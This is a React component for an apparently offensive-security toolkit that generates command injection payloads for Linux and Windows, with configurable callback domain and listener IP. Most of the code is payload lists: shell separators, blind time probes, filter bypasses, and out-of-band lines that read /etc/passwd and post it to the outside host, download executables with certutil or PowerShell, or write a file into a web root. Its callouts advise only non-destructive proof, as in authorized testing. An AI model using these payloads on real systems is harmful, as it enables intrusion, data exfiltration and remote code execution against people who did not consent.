import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CopyChip,
  DownloadButton,
  SectionTitle,
  Select,
  Tabs,
  TextInput,
} from '@/components/ui';
import { DEFAULT_CALLBACK_HOST, DEFAULT_OOB_DOMAIN } from '@/tools/registry';

type Os = 'linux' | 'windows' | 'both';
type Class = 'basic' | 'time' | 'oob' | 'arg' | 'env' | 'bypass';

const OS_OPTIONS = [
  { value: 'linux', label: 'Linux' },
  { value: 'windows', label: 'Windows' },
  { value: 'both', label: 'Both' },
] as const;

const CLASSES: Array<{ value: Class; label: string; note: string }> = [
  { value: 'basic', label: 'Basic separators', note: 'Independent command execution after the separator' },
  { value: 'time', label: 'Blind (time)', note: 'Delay proves execution where output is not reflected' },
  { value: 'oob', label: 'Blind (OAST)', note: 'DNS/HTTP callback proves the shell ran' },
  { value: 'arg', label: 'Argument injection', note: 'No shell metacharacters needed — flags only' },
  { value: 'env', label: 'Environment / expansion', note: 'Variable expansion as a payload carrier' },
  { value: 'bypass', label: 'Filter bypass', note: 'Neutralises naive regex and blacklists' },
];

const LINUX_SEP = [';', '&&', '||', '|', '%0a', '`id`', '$(id)', '&'];
const WIN_SEP = ['&', '&&', '||', '|', '%0a', '^&'];

export default function CommandInjectionCheatsheet() {
  const [os, setOs] = useState<Os>('linux');
  const [cls, setCls] = useState<Class>('basic');
  const [param, setParam] = useState('host');
  const [host, setHost] = useState(DEFAULT_OOB_DOMAIN);
  const [hostIp, setHostIp] = useState(DEFAULT_CALLBACK_HOST);
  const [cmd, setCmd] = useState('id');

  const osList: Array<'linux' | 'windows'> = os === 'both' ? ['linux', 'windows'] : [os];

  const groups = useMemo(() => {
    const h = host.trim() || DEFAULT_OOB_DOMAIN;
    const ip = hostIp.trim() || DEFAULT_CALLBACK_HOST;
    return osList.map((o) => {
      const seps = o === 'linux' ? LINUX_SEP : WIN_SEP;
      const items: string[] = [];
      if (cls === 'basic') {
        items.push(...seps.map((s) => `${s}${cmd.trim() || 'id'}`));
        items.push(o === 'linux' ? '|whoami' : '|whoami & echo done');
        items.push(`${seps[0]}${o === 'linux' ? 'cat /etc/passwd' : 'type C:\\Windows\\win.ini'}`);
      } else if (cls === 'time') {
        items.push(
          ...(o === 'linux'
            ? [';sleep 5', '| sleep 5', '`sleep 5`', '$(sleep 5)', '; ping -c 5 127.0.0.1', '; sleep 5 #']
            : ['& ping -n 5 127.0.0.1', '| ping -n 5 127.0.0.1', '& timeout /t 5 /nobreak', '& ping -n 5 127.0.0.1 > nul']),
        );
      } else if (cls === 'oob') {
        items.push(
          ...(o === 'linux'
            ? [`; curl http://${h}/x`, `; wget -qO- http://${h}/y`, `; nslookup ${h}`, `; curl -d @/etc/passwd http://${h}/exfil`, `; curl $(whoami).${h}`]
            : [`& nslookup ${h}`, `| certutil -urlcache -f http://${h}/a.exe a.exe`, `& powershell -c "iwr http://${h}/p"`, `& curl http://${ip}/x`]),
        );
      } else if (cls === 'arg') {
        items.push(
          ...(o === 'linux'
            ? ['--version', '$(echo etc/passwd)', '-o /tmp/pwn', '-f /etc/passwd', '--config=/tmp/pwn']
            : ['/c whoami', '-o NUL', '/K dir', '/c "echo x > C:\\inetpub\\wwwroot\\x.asp"']),
        );
      } else if (cls === 'env') {
        items.push(
          ...(o === 'linux'
            ? ['${IFS}id', '$IFS$9id', '${PATH:0:1}bin${PATH:0:1}id', '${HOME:0:1}', '${SHELLOPTS}']
            : ['%PATH:~0,1%whoami', '%COMSPEC% /c whoami', '%USERPROFILE%']),
        );
      } else {
        items.push(
          ...(o === 'linux'
            ? [`c''at /etc/passwd`, `${'$'}@ id`, `who$()ami`, `\\x69d`, `c\\at /etc/passwd`, `%09id`, `cat${String.fromCharCode(9)}/etc/passwd`]
            : [`who^ami`, `%0d%0awhoami`, `who""ami`, `^&whoami`]),
        );
      }
      return { os: o, items };
    });
  }, [osList, cls, cmd, host, hostIp]);

  const flat = groups.map((g) => [`# ${g.os}`, ...g.items, ''].join('\n')).join('\n');
  const active = groups[0];
  const [tab, setTab] = useState<'linux' | 'windows'>('linux');
  const shown = groups.find((g) => g.os === tab) ?? active;

  return (
    <>
      <Card title="Configuration">
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          <Select label="OS" value={os} onChange={setOs} options={OS_OPTIONS.map((o) => ({ value: o.value, label: o.label }))} />
          <Select label="Injection type" value={cls} onChange={setCls} options={CLASSES.map((c) => ({ value: c.value, label: c.label }))} hint={CLASSES.find((c) => c.value === cls)!.note} />
          <TextInput label="Injected command" value={cmd} onChange={setCmd} mono hint="Used by the basic separator class" />
          <TextInput label="Vulnerable parameter" value={param} onChange={setParam} mono />
          <TextInput label="OAST domain" value={host} onChange={setHost} mono />
          <TextInput label="Listener IP" value={hostIp} onChange={setHostIp} mono />
        </div>
      </Card>

      <Card
        title="Payloads"
        action={<DownloadButton text={flat} filename="cmdinj-payloads.txt" label="Download .txt" />}
      >
        {groups.length > 1 && (
          <div className="mb-3">
            <Tabs value={tab} onChange={setTab} tabs={groups.map((g) => ({ value: g.os, label: g.os === 'linux' ? 'Linux' : 'Windows', badge: g.items.length }))} />
          </div>
        )}
        <SectionTitle right={<span className="text-[11.5px] text-[var(--text-faint)]">{shown.items.length} lines</span>}>
          {CLASSES.find((c) => c.value === cls)!.label}
        </SectionTitle>
        <div className="flex flex-col gap-1.5">
          {shown.items.map((p, i) => (
            <CopyChip key={i} text={p} />
          ))}
        </div>
      </Card>

      <Card title="Hazards & evidence">
        <div className="grid gap-3 sm:grid-cols-2">
          <Callout tone="warn" title="Separator parity">
            <span className="rf-mono">;</span> needs a shell. <span className="rf-mono">&amp;&amp;</span> requires the first
            command to succeed, <span className="rf-mono">||</span> requires it to fail. If the app appends a value after
            your input, terminate with a comment (<span className="rf-mono">;</span> on Linux,{' '}
            <span className="rf-mono">&amp; REM</span> on Windows) so the suffix is ignored.
          </Callout>
          <Callout tone="info" title="Proving blind execution">
            Repeat the time probe three times: one request must take roughly five seconds longer than the control. A
            single slow response is a cold cache; three consistent 5 s delays are command execution. OAST callbacks give a
            timestamped artefact — pair the DNS query with the request ID in your proxy log.
          </Callout>
          <Callout tone="danger" title="Destructive characters">
            Everything runs as the web service account. Do not issue <span className="rf-mono">rm</span>,{' '}
            <span className="rf-mono">shutdown</span> or service restarts; use <span className="rf-mono">id</span>,{' '}
            <span className="rf-mono">whoami</span>, <span className="rf-mono">hostname</span> and{' '}
            <span className="rf-mono">uname -a</span> as proof and stop there.
          </Callout>
          <Callout tone="ok" title="Candidate sink list">
            Ping/NS lookup tools, image converters (ImageMagick delegates), PDF generators, backup/export jobs, and any
            endpoint whose parameter name is <span className="rf-mono">{param || 'host'}</span>,{' '}
            <span className="rf-mono">target</span>, <span className="rf-mono">ip</span> or{' '}
            <span className="rf-mono">domain</span>.
          </Callout>
        </div>
        {groups.length === 0 && (
          <Callout tone="info" title="Nothing to show">Select an OS and injection type to generate payloads.</Callout>
        )}
      </Card>
    </>
  );
}
